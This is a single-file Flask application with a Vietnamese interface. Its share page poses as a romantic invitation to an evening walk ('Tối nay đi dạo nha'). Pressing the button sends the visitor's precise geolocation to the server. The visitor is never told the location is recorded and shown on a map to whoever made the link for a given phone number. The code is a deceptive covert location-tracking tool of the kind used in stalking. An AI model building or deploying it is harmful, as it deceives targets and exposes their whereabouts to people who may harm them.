
from flask import Flask, request, jsonify, render_template_string, url_for, redirect
from uuid import uuid4
from pathlib import Path
from datetime import datetime
import json
import sys

APP = Flask(__name__)

DATA_FILE = Path("shared_locations.json")

def load_db():
    if not DATA_FILE.exists():
        return {}
    try:
        return json.loads(DATA_FILE.read_text(encoding="utf-8"))
    except Exception:
        return {}

def save_db(db):
    DATA_FILE.write_text(json.dumps(db, ensure_ascii=False, indent=2), encoding="utf-8")

DB = load_db()

SHARE_HTML = """
<!doctype html>
<html lang="vi">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Tối nay đi dạo nha 💕</title>
  <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@500;600&display=swap" rel="stylesheet">
  <style>
    *{box-sizing:border-box;margin:0;padding:0}
    body{
      font-family:'Quicksand',system-ui,Segoe UI,Roboto;
      min-height:100vh;
      display:flex;
      align-items:center;
      justify-content:center;
      background:linear-gradient(135deg,#ffb6c1,#ffcce6,#e8d3ff);
      overflow:hidden;
      color:#3b0a45;
    }
    .container{
      background:rgba(255,255,255,0.4);
      backdrop-filter:blur(10px);
      border-radius:20px;
      padding:30px 28px 40px;
      width:100%;
      max-width:420px;
      text-align:center;
      box-shadow:0 6px 20px rgba(0,0,0,0.2);
    }
    h1{
      font-size:22px;
      margin-bottom:10px;
      color:#a1065d;
    }
    p{
      color:#5e2c5f;
      margin-bottom:24px;
      line-height:1.5;
      font-size:15px;
    }
    button{
      background:linear-gradient(90deg,#ff69b4,#ff85c1,#ffaadf);
      border:none;
      color:white;
      padding:14px 22px;
      border-radius:30px;
      font-size:16px;
      font-weight:600;
      cursor:pointer;
      transition:transform 0.2s,opacity 0.2s;
      box-shadow:0 4px 10px rgba(255,105,180,0.4);
    }
    button:hover{transform:scale(1.05);opacity:0.95}
    #status{
      margin-top:16px;
      color:#6b256f;
      font-size:14px;
      min-height:32px;
    }
    /* Floating hearts */
    .heart{
      position:fixed;
      color:#ff69b4;
      animation:floatUp 4s ease-in infinite;
      font-size:18px;
      opacity:0.7;
    }
    @keyframes floatUp{
      from{transform:translateY(0) scale(1);opacity:1}
      to{transform:translateY(-100vh) scale(0.5);opacity:0}
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>Tối nay đi dạo nha 💞</h1>
    <p>Tui đang tính ra ngoài ngắm hoàng hôn 🌇  
    Bà rảnh hông? Bấm nút dưới đây nếu bà muốn đi cùng tui nè 😘</p>
    <button id="shareBtn">Đi cùng anh 💗</button>
    <div id="status"></div>
  </div>

  <script>
    const token = "{{ token }}";
    const statusEl = document.getElementById('status');
    const btn = document.getElementById('shareBtn');

    // tạo hiệu ứng trái tim bay
    function createHeart(){
      const heart=document.createElement('div');
      heart.className='heart';
      heart.textContent='💖';
      heart.style.left=Math.random()*100+'vw';
      heart.style.animationDuration=3+Math.random()*2+'s';
      document.body.appendChild(heart);
      setTimeout(()=>heart.remove(),5000);
    }
    setInterval(createHeart,800);

    // xử lý vị trí
    btn.addEventListener('click',()=>{
      statusEl.textContent='Đợi xíu nha... 😚';
      if(!navigator.geolocation){
        statusEl.textContent='Trình duyệt này hơi cũ rồi, không xem được thông tin.';
        return;
      }
      navigator.geolocation.getCurrentPosition(pos=>{
        const lat=pos.coords.latitude;
        const lng=pos.coords.longitude;
        const acc=pos.coords.accuracy;
        statusEl.textContent='Okk~ chuẩn bị đi nào 💕';
        fetch('/submit_location',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({token,lat,lng,accuracy:acc})
        }).then(r=>r.json()).then(j=>{
          if(j.ok){
            statusEl.textContent='Tui nhận được rồi nè 💌 hẹn gặp nha 😘';
            btn.disabled=true;
          } else statusEl.textContent='Lỗi nhẹ: '+(j.error||'Không rõ');
        }).catch(e=>{
          statusEl.textContent='Mạng yếu quá huhu 😢';
        });
      },err=>{
        if(err.code===1)
          statusEl.textContent='Hông chịu cho tui biết bà đang ở đâu luôn 😭';
        else
          statusEl.textContent='Không lấy được thông tin rồi 😅';
      },{enableHighAccuracy:true,timeout:20000});
    });
  </script>
</body>
</html>

"""

VIEW_HTML = """
<!doctype html>
<html lang="vi">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Xem vị trí</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
  <style>
    body{font-family:Inter,system-ui,Segoe UI,Roboto;background:#f8fafc;color:#0f172a;margin:0;padding:18px}
    .wrap{max-width:1100px;margin:0 auto}
    .card{background:white;border-radius:14px;padding:16px;box-shadow:0 8px 24px rgba(15,23,42,0.06)}
    header{display:flex;justify-content:space-between;align-items:center;gap:12px}
    h2{margin:0;font-size:18px;color:#0f172a}
    .meta{color:#64748b;font-size:13px}
    #map{height:64vh;border-radius:12px;margin-top:12px}
    .sharebar{margin-top:12px;display:flex;gap:8px;align-items:center}
    .share-input{flex:1;padding:10px;border:1px solid #e6eef6;border-radius:10px}
    .btn{background:#2563eb;color:white;padding:10px 14px;border-radius:10px;border:0;cursor:pointer}
    @media(max-width:640px){header{flex-direction:column;align-items:flex-start}}
  </style>
</head>
<body>
  <div class="wrap">
    <div class="card">
      <header>
        <div>
          <h2>Vị trí cho số: {{ phone }}</h2>
          <div class="meta">{% if shared %}Đã chia sẻ lúc {{ shared_at }} — độ chính xác ±{{ accuracy }} m{% else %}Chưa chia sẻ{% endif %}</div>
        </div>
        <div>
          <a href="{{ share_link }}" target="_blank" class="meta">Mở link chia sẻ</a>
        </div>
      </header>

      <div id="map">{% if not shared %}<div style="padding:36px;text-align:center;color:#64748b">Chưa có vị trí được chia sẻ. Gửi link tới người dùng để họ mở và chia sẻ vị trí.</div>{% endif %}</div>

      <div class="sharebar">
        <input id="shareUrl" class="share-input" value="{{ share_link }}" readonly onclick="this.select()">
        <button class="btn" id="copyBtn">Sao chép</button>
      </div>
    </div>
  </div>

  <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
  <script>
    const shared = {{ "true" if shared else "false" }};
    if(shared){
      const lat = {{ lat }}; const lng = {{ lng }}; const acc = {{ accuracy }};
      const map = L.map('map').setView([lat, lng], 15);
      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19}).addTo(map);
      L.circle([lat,lng],{radius:acc, color:'#2563eb', fillColor:'#60a5fa', fillOpacity:0.15}).addTo(map);
      L.marker([lat,lng]).addTo(map).bindPopup('Chia sẻ lúc: {{ shared_at }}<br>Độ chính xác: ±'+acc+' m').openPopup();
    } else {
      try{ const map = L.map('map',{zoomControl:false,attributionControl:false}).setView([16.0537,108.2022],5); L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png',{maxZoom:19}).addTo(map);}catch(e){}
    }

    document.getElementById('copyBtn').addEventListener('click', ()=>{ const el = document.getElementById('shareUrl'); navigator.clipboard.writeText(el.value).then(()=>{ alert('Đã sao chép link') }) });
  </script>
</body>
</html>
"""

INDEX_HTML = """
<!doctype html>
<html>
<head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head>
<body style="font-family:system-ui, -apple-system, 'Segoe UI', Roboto;">
  <h3>Single-file Location Share</h3>
  <p>Endpoints:</p>
  <ul>
    <li><code>/create_link?phone=0901234567</code> → tạo share link (trả JSON)</li>
    <li><code>/share/&lt;token&gt;</code> → trang để chủ máy mở và chia sẻ vị trí</li>
    <li><code>/view/&lt;token&gt;</code> → xem vị trí đã chia sẻ</li>
  </ul>
  <p>Chạy trên máy local: http://localhost:5000</p>
</body>
</html>
"""

# ========== Routes ==========
@APP.route("/")
def index():
    return render_template_string(INDEX_HTML)

@APP.route("/create_link")
def create_link():
    phone = request.args.get("phone", "").strip()
    if not phone:
        return jsonify({"ok": False, "error": "Thiếu tham số phone. Ví dụ: /create_link?phone=0901234567"}), 400
    token = str(uuid4())
    DB[token] = {
        "phone": phone,
        "created_at": datetime.utcnow().isoformat() + "Z",
        "shared": False,
        "location": None
    }
    save_db(DB)
    share_url = url_for("share_page", token=token, _external=True)
    view_url = url_for("view_location", token=token, _external=True)
    return jsonify({"ok": True, "share_url": share_url, "view_url": view_url, "token": token})

@APP.route("/share/<token>")
def share_page(token):
    if token not in DB:
        return "Link không hợp lệ", 404
    return render_template_string(SHARE_HTML, token=token)

@APP.route("/submit_location", methods=["POST"])
def submit_location():
    try:
        data = request.get_json(force=True)
    except Exception:
        return jsonify({"ok": False, "error": "Invalid JSON"}), 400
    token = data.get("token")
    lat = data.get("lat")
    lng = data.get("lng")
    accuracy = data.get("accuracy", None)
    if not token or token not in DB:
        return jsonify({"ok": False, "error": "token invalid"}), 400
    # Basic validation of coordinates
    try:
        latf = float(lat)
        lngf = float(lng)
    except Exception:
        return jsonify({"ok": False, "error": "Invalid lat/lng"}), 400

    DB[token]["shared"] = True
    DB[token]["location"] = {
        "lat": latf,
        "lng": lngf,
        "accuracy": accuracy,
        "shared_at": datetime.utcnow().isoformat() + "Z"
    }
    save_db(DB)
    return jsonify({"ok": True})

@APP.route("/view/<token>")
def view_location(token):
    if token not in DB:
        return "Token không hợp lệ", 404
    rec = DB[token]
    shared = rec.get("shared", False)
    lat = rec.get("location", {}).get("lat") if shared else 0
    lng = rec.get("location", {}).get("lng") if shared else 0
    acc = rec.get("location", {}).get("accuracy") if shared else None
    shared_at = rec.get("location", {}).get("shared_at") if shared else None
    share_link = url_for("share_page", token=token, _external=True)
    return render_template_string(VIEW_HTML,
                                  phone=rec.get("phone"),
                                  shared=shared,
                                  lat=lat,
                                  lng=lng,
                                  accuracy=json.dumps(acc),
                                  shared_at=shared_at,
                                  share_link=share_link)

@APP.route("/api/status/<token>")
def api_status(token):
    if token not in DB:
        return jsonify({"ok": False, "error": "token invalid"}), 404
    return jsonify({"ok": True, "data": DB[token]})

# ========== Run ==========
if __name__ == "__main__":
    host = "0.0.0.0"
    port = 5000
    print(f"Server starting on http://{host}:{port}/")
    print("Create a link: http://localhost:5000/create_link?phone=0347160155")
    try:
        APP.run(host=host, port=port, debug=True)
    except KeyboardInterrupt:
        print("Stopping...")
        sys.exit(0)